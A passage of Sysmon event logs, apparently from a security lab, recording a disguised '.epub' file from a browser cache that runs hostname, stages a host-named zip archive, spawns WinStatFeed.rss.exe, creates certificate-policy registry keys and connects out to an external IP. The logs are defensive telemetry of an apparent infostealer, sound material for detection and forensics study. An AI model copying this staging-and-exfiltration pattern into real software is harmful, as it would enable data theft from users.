+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Protocol">tcp</Data> 
+  <Data Name="Initiated">true</Data> 
+  <Data Name="SourceIsIpv6">false</Data> 
+  <Data Name="SourceIp">10.10.10.245</Data> 
+  <Data Name="SourceHostname">WK001.megacorpone.com</Data> 
+  <Data Name="SourcePort">57286</Data> 
+  <Data Name="SourcePortName">-</Data> 
+  <Data Name="DestinationIsIpv6">false</Data> 
+  <Data Name="DestinationIp">145.1.0.92</Data> 
+  <Data Name="DestinationHostname">-</Data> 
+  <Data Name="DestinationPort">443</Data> 
+  <Data Name="DestinationPortName">https</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:00.5041957Z" /> 
+  <EventRecordID>692677</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:00.495</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c888-6891-1537-000000000c00}</Data> 
+  <Data Name="ProcessId">22220</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data> 
+  <Data Name="FileVersion">-</Data> 
+  <Data Name="Description">-</Data> 
+  <Data Name="Product">-</Data> 
+  <Data Name="Company">-</Data> 
+  <Data Name="OriginalFileName">-</Data> 
+  <Data Name="CommandLine">"C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe" --start-browser chrome --output-path C:\Users\a.smith\AppData\Local\Temp</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=D58591E7163A8F32F690BFF9B042D354153B7D37,MD5=18D90358D511779A3DF98715AA0A86B7,SHA256=59757292C0F4525C8B8F33DD89B937CB7493E2D98B49C5A76EECB18B83BB0019,IMPHASH=F08929C2BA8072A2F38B0EA7BB4C0832</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>11</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>11</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:00.4610123Z" /> 
+  <EventRecordID>692676</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:00.459</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\newsfeed.rss</Data> 
+  <Data Name="CreationUtcTime">2025-08-05 09:02:00.459</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>11</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>11</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.5205036Z" /> 
+  <EventRecordID>692634</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.518</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\101010245WK001.zip</Data> 
+  <Data Name="CreationUtcTime">2025-08-05 09:01:59.518</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.5104717Z" /> 
+  <EventRecordID>692630</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.509</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c887-6891-1437-000000000c00}</Data> 
+  <Data Name="ProcessId">13704</Data> 
+  <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data> 
+  <Data Name="FileVersion">10.0.26100.2161 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Hostname APP</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">hostname.exe</Data> 
+  <Data Name="CommandLine">"hostname"</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.5083860Z" /> 
+  <EventRecordID>692629</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.506</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c887-6891-1337-000000000c00}</Data> 
+  <Data Name="ProcessId">7396</Data> 
+  <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data> 
+  <Data Name="FileVersion">10.0.26100.2161 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Hostname APP</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">hostname.exe</Data> 
+  <Data Name="CommandLine">"hostname"</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3575362Z" /> 
+  <EventRecordID>692628</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.357</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft\SystemCertificates</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3575184Z" /> 
+  <EventRecordID>692627</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.357</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3574881Z" /> 
+  <EventRecordID>692626</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.357</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3574583Z" /> 
+  <EventRecordID>692625</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.357</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3561950Z" /> 
+  <EventRecordID>692624</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.354</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft\SystemCertificates</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3559325Z" /> 
+  <EventRecordID>692623</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.354</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3558977Z" /> 
+  <EventRecordID>692622</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.354</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3558790Z" /> 
+  <EventRecordID>692621</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.354</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3511721Z" /> 
+  <EventRecordID>692620</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.350</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft\SystemCertificates</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3511450Z" /> 
+  <EventRecordID>692619</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.350</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3511064Z" /> 
+  <EventRecordID>692618</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.350</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3510627Z" /> 
+  <EventRecordID>692617</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.350</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3495146Z" /> 
+  <EventRecordID>692616</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
